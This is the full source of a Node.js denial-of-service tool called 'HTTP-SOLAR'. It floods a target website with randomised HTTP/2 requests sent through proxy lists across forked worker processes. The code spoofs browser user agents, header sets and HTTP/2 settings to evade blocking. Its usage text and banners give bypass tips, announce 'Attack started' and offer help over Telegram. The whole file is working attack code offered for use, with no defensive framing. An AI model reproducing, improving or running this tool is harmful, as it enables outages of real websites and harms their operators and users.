if (process.argv.length < 8) {
  const filePath = require('path').basename(__filename);
  var usage = '';
  usage += '\x1b[31m> HTTP-SOLAR - CODED BY DauDau\n\x1b[0m';
  usage += '\x1b[32m> Here is basic usage of script:\n\x1b[0m';
  usage += '\x1b[32m> node ' + filePath + ' <URL> <DURATION> <RATES> <THREADS> <PROXIES> <PROTOCOL>\n\x1b[0m';
  usage += '\x1b[33m• <URL>: https://www.google.com/search/\n\x1b[0m';
  usage += '\x1b[33m• <DURATION>: Attack duration in seconds. Example: 30, 60, 120\n\x1b[0m';
  usage += '\x1b[33m• <RATES>: Requests per IP address, use 16/32 to avoid blocking\n\x1b[0m';
  usage += '\x1b[33m• <THREADS>: Threads should not be greater than your CPU cores\n\x1b[0m';
  usage += '\x1b[33m• <PROXIES>: Path to the file that contains your proxies. Example: proxies.txt\n\x1b[0m';
  usage += '\x1b[33m• <PROTOCOL>: Use http/socks4/socks5 for <PROTOCOL> to set proxy type for script\n\x1b[0m';
  usage += '\x1b[32m> Example: node ' + filePath + ' https://cfcybernews.eu 120 64 2 proxies.txt http\x1b[0m';
  console.log(usage);
  process.exit(0);
}
const errorHandler = error => {
  // console.log(error);
  return error;
};
process.on('uncaughtException', errorHandler);
process.on('unhandledRejection', errorHandler);
Array.prototype.delete = function (value) {
  this.splice(this.indexOf(value), 1);
}
Array.prototype.shuffle = function () {
  return this.sort(a => Math.random() - 0.5);
}
Object.prototype.shuffle = function () {
  const object = {};
  Object.keys(this).shuffle().forEach(key => object[key] = this[key]);
  return object;
}
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const crypto = require('crypto');
const net = require('net');
const http2 = require('http2');
const fs = require('fs');
const tls = require('tls');
const cluster = require('cluster');
const args = {
  url: process.argv[2],
  duration: process.argv[3] * 1000,
  rates: +process.argv[4],
  threads: +process.argv[5],
  proxies: process.argv[6],
  protocol: process.argv[7]
};
const characters = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890';
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(args.proxies);
const target = new URL(args.url);
target.path = target.pathname + target.search;
function path(input, length) {
  let output = '';
  for (let index = 0; index < length; index++) {
    output += randList(characters);
  }
  return input.replace(/=RAND=/g, output);
}
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/<version>.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/<version>.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/<version>.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/<version>.0.0.0 Mobile/15E148 Safari/604.1'
];
const prefixes = ['accept', 'accept-ch', 'access', 'access-control', 'access-control-allow', 'access-control-request', 'alt', 'content', 'content-security', 'content-security-policy', 'cross', 'cross-origin', 'if', 'origin', 'proxy', 'referer', 'sec', 'sec-ch', 'sec-ch-ua', 'sec-fetch', 'server', 'set', 'x', 'x-forwarded'];
function generateKey(keyLength) {
  const parts = new Set();
  const prefixParts = randList(prefixes).split('-');
  parts.add(...prefixParts);
  while (parts.size < keyLength) {
    const extraParts = randList(prefixes).split('-');
    const extraKey = randList(extraParts);
    parts.add(extraKey);
  }
  return [...parts].join('-');
}
function randHeaders(length) {
  const rateHeaders = {
    'cache-control': 'no-cache',
    'sec-fetch-site': 'none',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-dest': 'document'
  };
  const keys = Object.keys(rateHeaders);
  const headers = {};
  for (let i = 0; i < length; i++) {
    const key = randList(keys);
    keys.delete(key);
    headers[key] = rateHeaders[key];
  }
  return headers;
}
function generateEntries(length) {
  const headers = {};
  for (let i = 0; i < length; i++) {
    const keyLength = randInt(3, 5);
    const headerKey = generateKey(keyLength);
    headers[headerKey] = generateKey(keyLength) + '=' + path('=RAND=', length);
  }
  return headers;
}
function createSocket() {
  const socket = new net.Socket();
  socket.allowHalfOpen = true;
  socket.writable = true;
  socket.readable = true;
  socket.setNoDelay(true);
  socket.setKeepAlive(true, args.duration);
  return socket;
}
class Tunnel {
  HTTP(options) {
    const buffer = Buffer.from('CONNECT ' + options.address + ' HTTP/1.1\r\nHost: ' + options.address + '\r\nConnection: Keep-Alive\r\n\r\n', 'ascii');
    const socket = createSocket();
    socket.connect(options.port, options.host);
    const timeout = setTimeout(function () {
      socket.destroy();
    }, options.timeout);
    socket.once('connect', function () {
      clearTimeout(timeout);
      socket.write(buffer);
    });
    socket.once('data', data => {
      data.toString().indexOf('HTTP/1.1 200') === -1 ? socket.destroy() : options.handler(socket);
    });
  }
  SOCKS4(options) {
    const address = options.address.split(':');
    const addrHost = address[0];
    const addrPort = +address[1];
    const requestBuffer = Buffer.alloc(10 + addrHost.length);
    requestBuffer[0] = 0x04;
    requestBuffer[1] = 0x01;
    requestBuffer[2] = addrPort >> 8;
    requestBuffer[3] = addrPort & 0xff;
    requestBuffer[4] = 0x00;
    requestBuffer[5] = 0x00;
    requestBuffer[6] = 0x00;
    requestBuffer[7] = 0x01;
    requestBuffer[8] = 0x00;
    Buffer.from(addrHost, 'ascii').copy(requestBuffer, 9, 0, addrHost.length);
    requestBuffer[requestBuffer.length - 1] = 0x00;
    const socket = createSocket();
    socket.connect(options.port, options.host);
    const timeout = setTimeout(function () {
      socket.destroy();
    }, options.timeout);
    socket.once('connect', function () {
      clearTimeout(timeout);
      socket.write(requestBuffer);
    });
    socket.once('data', data => {
      data.length !== 8 || data[1] !== 0x5A ? socket.destroy() : options.handler(socket);
    });
  }
  SOCKS5(options) {
    const address = options.address.split(':');
    const addrHost = address[0];
    const addrPort = +address[1];
    const greeting = Buffer.from([0x05, 0x01, 0x00]);
    const buffer = Buffer.alloc(addrHost.length + 7);
    buffer[0] = 0x05;
    buffer[1] = 0x01;
    buffer[2] = 0x00;
    buffer[3] = 0x03;
    buffer[4] = addrHost.length;
    Buffer.from(addrHost, 'ascii').copy(buffer, 5, 0, addrHost.length);
    buffer[buffer.length - 2] = addrPort >> 8;
    buffer[buffer.length - 1] = addrPort & 0xff;
    const socket = createSocket();
    socket.connect(options.port, options.host);
    const timeout = setTimeout(function () {
      socket.destroy();
    }, options.timeout);
    socket.once('connect', function () {
      clearTimeout(timeout);
      socket.write(greeting);
    });
    socket.once('data', data => {
      if (data.length !== 2 || data[0] !== 0x05 || data[1] !== 0x00) {
        socket.destroy();
        return;
      }
      socket.write(buffer);
      socket.once('data', data => {
        data[0] !== 0x05 || data[1] !== 0x00 ? socket.destroy() : options.handler(socket);
      });
    });
  }
}
const tunnel = new Tunnel();
const protocols = {
  http: tunnel.HTTP,
  socks4: tunnel.SOCKS4,
  socks5: tunnel.SOCKS5
};
function excluded(start, end) {
  const range = randInt(start, end);
  const value = 2 ** range;
  return value == 2 ** end ? value - 1 : value;
}
function generateCrSettings(length) {
  const settings = {
    headerTableSize: 65536,
    enablePush: false,
    maxConcurrentStreams: 1000,
    initialWindowSize: 6291456,
    maxHeaderListSize: 262144,
    maxFrameSize: 16384
  };
  const keys = Object.keys(settings);
  for (let index = 1; index < length; index++) {
    const settingKey = randList(keys);
    delete settings[settingKey];
  }
  return settings;
}
function generateFakeSettings(length) {
  const settings = {
    headerTableSize: excluded(12, 32),
    enablePush: !randInt(0, 1),
    maxConcurrentStreams: 10 ** randInt(2, 3),
    initialWindowSize: excluded(16, 31),
    maxHeaderListSize: excluded(16, 32),
    maxFrameSize: excluded(14, 24),
  };
  const keys = Object.keys(settings);
  for (let index = 1; index < length; index++) {
    const settingKey = randList(keys);
    delete settings[settingKey];
  }
  return settings;
}
function generateUserAgent() {
  const version = randInt(117, 121);
  return randList(userAgents).replace(/<version>/g, version);
}
const userAgent = generateUserAgent();
function createSecureTransport(socket) {
  return new Promise(resolve => {
    const secureSocket = tls.connect(443, target.host, {
      ALPNProtocols: ['h2'],
      servername: target.host,
      rejectUnauthorized: false,
      secureProtocol: 'TLS_method',
      socket: socket,
      ecdhCurve: 'x25519:secp256r1:secp384r1',
      ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
      secureOptions: crypto.constants.SSL_OP_ALL |
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_TLSv1 |
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
        crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
    });
    secureSocket.on('secureConnect', function () {
      const createConnection = () => secureSocket;
      resolve(createConnection);
    });
  });
}
const settings = [
  generateCrSettings,
  generateFakeSettings
];
async function handler(socket) {
  const settingsLength = randInt(1, 3) * randInt(1, 2);
  const session = http2.connect(target, {
    settings: settings[socket.localPort & 1](settingsLength),
    maxDeflateDynamicTableSize: 4294967295,
    maxSessionMemory: 1000,
    createConnection: await createSecureTransport(socket)
  });
  session.on('connect', session => {
    session.setLocalWindowSize(15728640);
    const createRequests = setInterval(function () {
      const requestRate = randInt(1, args.rates);
      for (let index = 0; index < requestRate; index++) {
        const headersLength = randInt(1, 4);
        const request = session.request(
          {
            ':method': 'GET',
            ':authority': target.host,
            ':scheme': 'https',
            ':path': path(target.path, 8),
            'sec-ch-ua-mobile': '?0',
            'upgrade-insecure-requests': '1',
            'user-agent': userAgent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            ...randHeaders(headersLength),
            'accept-encoding': 'br, gzip',
            'accept-language': 'en-US;q=0.9,en;q=0.8',
            ...generateEntries(headersLength * 4)
          },
          {
            weight: 256,
            parent: 0,
            exclusive: false
          }
        );
        var data = '';
        request.on('data', chunk => data += chunk);
        request.on('end', function () {
          if (Math.random() < 0.5) return;
          request.close();
          request.destroy();
        });
        request.end();
      }
    }, 1);
    session.on('error', error => {
      clearInterval(createRequests);
    });
  });
}
function prepareAttack() {
  const proxy = randList(proxies).split(':');
  const options = {
    host: proxy[0],
    port: +proxy[1],
    address: target.host + ':443',
    timeout: 5000,
    handler
  };
  protocols[args.protocol](options);
}
if (cluster.isPrimary) {
  const suggestions = [
    'Use SOCKS4/SOCKS5 for better bypass',
    'Never use <RATES> greater than 100',
    'Use =RAND= in <URL> to generate query string',
    'Contact @Daukute on Telegram if you need help',
    'Press Ctrl + C to stop the script'
  ];
  var banner = '';
  banner += '\x1b[31m> HTTP-SOLAR - CODED BY DauDau\n\x1b[0m';
  banner += '\x1b[32m> Status: Attack started!\n\x1b[0m';
  banner += '\x1b[36m• Target: ' + args.url + '\n\x1b[0m';
  banner += '\x1b[36m• Duration: ' + args.duration / 1000 + ' seconds\n\x1b[0m';
  banner += '\x1b[36m• Rates: ' + args.rates + '\n\x1b[0m';
  banner += '\x1b[36m• Threads: ' + args.threads + '\n\x1b[0m';
  banner += '\x1b[36m• Protocol: ' + args.protocol.toUpperCase() + '\n\x1b[0m';
  banner += '\x1b[33m> Suggestion: ' + randList(suggestions) + '\x1b[0m';
  console.log(banner);
  setTimeout(function () {
    console.log('\x1b[32m> Status: Attack stopped!\x1b[0m');
    process.exit(0);
  }, args.duration);
  for (let threads = 1; threads <= args.threads; threads++) {
    cluster.fork();
  }
} else {
  setInterval(prepareAttack);
}